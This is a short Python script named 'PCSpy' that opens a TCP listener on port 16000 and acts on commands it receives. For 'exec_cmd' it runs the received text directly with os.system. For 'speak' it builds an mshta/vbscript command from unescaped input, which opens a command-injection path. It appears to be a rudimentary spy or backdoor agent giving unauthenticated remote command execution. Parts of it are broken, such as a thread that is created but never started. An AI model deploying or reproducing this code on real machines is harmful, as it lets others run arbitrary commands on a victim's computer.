import socket
from threading import Thread
import os

app_name = "PCSpy"

serverIP = "localhost"
serverPort = 16000

serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSock.bind((serverIP, serverPort))
serverSock.listen(1)

def log(log, log_level):
    log_levels = [
        "[INFO]",
        "[LOG]",
        "[WARN]",
        "[ERROR]"
    ]

    print(f"{log_levels[log_level]}: {log}")

def exec_cmd():
    connection_, addr_ = serverSock.accept()
    data = connection_.recv(1024)
    data_ = data.decode('utf-8')
    os.system(data_)

def say():
    connection_, addr_ = serverSock.accept()
    data = connection_.recv(1024)
    data_ = data.decode('utf-8')
    os.system(f'mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""{data_}"")(window.close)")')

def creator():
    Thread(execute)

def execute(cmd):
    os.system(cmd)

while True:
    try:
        connection, addr = serverSock.accept()
        data = connection.recv(1024)

        data = data.decode('utf-8')

        if data == "exec_cmd":
            log("waiting for command", 0)
            exec_cmd()
        elif data == "creator":
            log(f"{app_name} by NVcoder!", 0)
            creator()
        elif data == "speak":
            log("waiting for text", 0)
            say()
        else:
            log(f"Server sent UNKNOWN action! ({data})", 2)
    except Exception as e:
        log(f"Error in networking client thread! Exception: {e}", 3)